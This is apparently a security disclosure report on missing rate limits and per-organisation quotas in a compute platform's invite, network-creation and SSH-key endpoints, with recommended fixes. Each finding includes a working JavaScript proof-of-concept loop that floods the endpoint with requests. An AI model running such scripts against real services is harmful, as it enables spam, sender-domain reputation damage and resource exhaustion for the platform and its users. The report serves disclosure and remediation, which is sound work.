# Security Report: Missing Rate Limits & Resource Caps (Ornn Compute)

Three related issues: abusable write endpoints with no per-org caps and weak/absent rate limiting. All share the same root cause and the same fix pattern (per-IP/user rate limit + hard per-org quota).

Org used in all PoCs: `37cc227b-d813-4954-94c2-0fbf32ecefd6`

| # | Issue | Endpoint | Severity | Why this rank |
|---|-------|----------|----------|---------------|
| 1 | Invite endpoint abuse | `POST /v1/invites` | **High** | Unlimited invites to arbitrary addresses damage our sending-domain reputation and push future legitimate mail into spam folders. Bursts also surface 502/500 errors. |
| 2 | Unbounded private network creation | `POST /v1/orchestrator/networks` | **Medium** | No cap and no observed rate limit; each network burns a CIDR block. Slow attack, but unbounded. |
| 3 | Unbounded SSH key creation | `POST /v1/organizations/{orgId}/ssh-keys` | **Medium-Low** | No cap; rate limiting may already exist. Mostly DB/UI clutter, lower blast radius. |

---

## 1. Invite Endpoint Abuse — HIGH

**Endpoint:** `POST https://compute.ornn.com/v1/invites`

### Problem
- Duplicate emails are rejected (`409`), but **unlimited unique emails** are accepted. An attacker can blast invites to arbitrary addresses.
- **Primary impact: email reputation / deliverability.** High volumes of unsolicited invites drive spam complaints and bounces against our sending domain, degrading its reputation so that *future legitimate* mail (invites, receipts, alerts) lands in spam or is rejected outright. This damage outlives the attack and is slow to recover.
- Secondary: bursts (~100 concurrent) surface **502 Bad Gateway** / **500 Internal Server Error** and pressure the DB and email queue. Not a sustained outage, but a sign the path isn't isolated.

### PoC
```js
async function batchInvites(total = 100, batchSize = 10, delayMs = 5000) {
  const orgId = "37cc227b-d813-4954-94c2-0fbf32ecefd6";
  const baseEmail = "test+";
  const domain = "@arjunaditya.xyz";

  let sent = 0;
  for (let i = 0; i < total; i += batchSize) {
    const batch = [];
    const end = Math.min(i + batchSize, total);
    for (let j = i; j < end; j++) {
      const email = `${baseEmail}${j}${domain}`;
      batch.push(
        fetch("/v1/invites", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ organization_id: orgId, email }),
        })
          .then(res => ({ status: res.status, email, ok: res.ok }))
          .catch(err => ({ error: err.message, email }))
      );
    }
    const results = await Promise.all(batch);
    console.log(`Batch ${Math.floor(i / batchSize) + 1} (${i+1}-${end}):`, results);
    sent += batch.length;
    if (sent < total) {
      await new Promise(resolve => setTimeout(resolve, delayMs));
    }
  }
  console.log(`Done! Sent ${sent} invites.`);
}
batchInvites(100, 10, 5000);
```

### Recommended fixes
1. **Rate limiting per IP/user** — e.g. 10 invites/min, 100/hour (token bucket or sliding window in Redis).
2. **Cap pending invites per org** — hard limit (e.g. 50 pending); reject beyond it.
3. **Async processing** — return `202 Accepted` and queue the send to move load off the request path.
4. **Re-invite cooldown** — even after an invite expires, enforce a cooldown before re-inviting the same address; optionally restrict org invites to an allowed domain.

---

## 2. Unbounded Private Network Creation — MEDIUM

**Endpoint:** `POST /v1/orchestrator/networks`

### Problem
- `name` field, **no hard cap** on networks per org.
- No `429` observed even at 1 request / 3s — attacker just spaces requests to create unlimited networks.
- Each network consumes an IP CIDR block plus DB records; names made unique via timestamp so no `409`.

### PoC
```javascript
async function slowSpamNetworks(total = 100, intervalMs = 3000) {
  let created = 0;
  for (let i = 0; i < total; i++) {
    const name = `net-${Date.now()}-${i}`;
    const res = await fetch("/v1/orchestrator/networks", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name })
    });
    if (res.ok) created++;
    console.log(`#${i+1}: ${res.status} (total: ${created})`);
    if (i < total - 1) await new Promise(r => setTimeout(r, intervalMs));
  }
  console.log(`Created ${created} networks. No cap.`);
}
slowSpamNetworks(100, 3000);
```
**Result:** all `201 Created`, no rate limit or cap hit. Works even with a valid session token, and could be distributed across proxies.

### Risks
| Risk | Impact |
|------|--------|
| Resource exhaustion | Each network consumes a CIDR block and DB records. |
| Performance degradation | Large network counts slow management APIs. |
| Billing abuse | If networks are billed, costs spike. |
| No uniqueness check | Timestamped names avoid conflicts. |

### Recommended fixes
| Fix | Implementation |
|-----|----------------|
| Hard cap per org | e.g. 20-50 networks. |
| Rate limiting | e.g. 5/minute on creation. |
| Name uniqueness | Unique names per org. |
| Quota alerting | Notify admins near the cap. |

---

## 3. Unbounded SSH Key Creation — MEDIUM-LOW

**Endpoint:** `POST /v1/organizations/{organizationId}/ssh-keys`

### Problem
- **No hard cap** on SSH keys per org. Rate limiting may exist (429s seen after bursts) but spacing requests bypasses it.
- Keys are org-wide, not tied to a resource → vector for DB record / UI-clutter exhaustion.

### PoC
```javascript
async function spamSshKeys(total = 50, intervalMs = 3000) {
  const orgId = "37cc227b-d813-4954-94c2-0fbf32ecefd6";
  const generateSSHKey = () => {
    const alg = "ssh-ed25519";
    const blob = new Uint8Array(4 + alg.length + 4 + 32);
    let off = 0;
    new DataView(blob.buffer).setUint32(off, alg.length, false); off += 4;
    for (let i = 0; i < alg.length; i++) blob[off + i] = alg.charCodeAt(i); off += alg.length;
    new DataView(blob.buffer).setUint32(off, 32, false); off += 4;
    crypto.getRandomValues(new Uint8Array(blob.buffer, off, 32));
    return `ssh-ed25519 ${btoa(String.fromCharCode(...blob))} comment`;
  };
  let created = 0;
  for (let i = 0; i < total; i++) {
    const res = await fetch(`/v1/organizations/${orgId}/ssh-keys`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ label: `key-${Date.now()}-${i}`, public_key: generateSSHKey() })
    });
    if (res.ok) created++;
    console.log(`#${i+1}: ${res.status}`);
    await new Promise(r => setTimeout(r, intervalMs));
  }
  console.log(`Created ${created} keys.`);
}
spamSshKeys(50, 3000);
```
**Outcome:** all `201 Created`, no limit reached.

### Recommended fixes
| Fix | Implementation |
|-----|----------------|
| Hard cap per org | e.g. 50 keys; return `403` when exceeded. |
| Rate limiting | e.g. 5/minute on creation. |
| Clean-up policy | Auto-revoke/archive unused keys after a set period. |

---

## Cross-cutting recommendation

All three are the same bug class. Ship one shared mitigation:

1. **Rate-limiting middleware** keyed on IP + authenticated user, applied to all write endpoints (start with these three).
2. **Per-org resource quotas** enforced in a shared check (invites pending, networks, ssh-keys), returning `403` with a clear message when exceeded.
3. Prioritize **#1 (invites)** — it's the one with lasting external cost: sender-domain reputation damage that hurts all future email deliverability.
